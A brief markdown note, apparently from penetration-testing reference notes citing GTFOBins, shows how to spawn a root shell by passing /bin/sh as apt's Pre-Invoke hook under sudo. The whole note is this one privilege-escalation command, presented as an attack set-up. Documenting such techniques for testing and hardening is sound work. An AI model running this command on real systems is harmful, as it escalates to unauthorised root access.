# APT Spawn Shell
When the shell exits the `update` command is actually executed. [APT Spawn Shell](https://gtfobins.github.io/gtfobins/apt/). 


# Attack Set-up

### Command
```bash
   sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```
